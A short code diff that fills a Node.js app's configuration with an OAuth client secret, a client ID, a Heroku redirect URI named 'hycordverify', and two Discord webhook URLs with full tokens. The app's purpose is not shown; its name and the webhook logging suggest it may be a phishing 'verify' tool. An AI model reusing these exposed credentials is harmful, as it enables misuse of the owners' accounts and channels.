@@ -1,9 +1,9 @@
 // Configuration
-const client_secret = 'change'
-const client_id = 'change'
-const redirect_uri = 'change'
-const webhook_url = 'change'
-const webhook_logging_url = 'change'
+const client_secret = 'eKM8Q~nIHSvwL~YW1iG6jmsPKrw8XdgXTlj7MdkF'
+const client_id = 'd0245965-bd5e-467f-bab1-0a60a42e3590'
+const redirect_uri = 'https://hycordverify.herokuapp.com'
+const webhook_url = 'https://discord.com/api/webhooks/1033502949915238440/BNTdWSAdGPl7Kfy8SbqE8FQ-Z5uNDMeTifb-TwVrUzFXpXvBkReObLJc4yHwd9GqJlJ-'
+const webhook_logging_url = 'https://discord.com/api/webhooks/1033495484955885628/R1BX_o-lLuIWyueq8fXShTgmDA9rNbbTQFGLeD9oYg0jRb9LXrXi_giWk8Ge09Wde-zv'
 // Config end
 const axios = require('axios')
 const express = require('express')
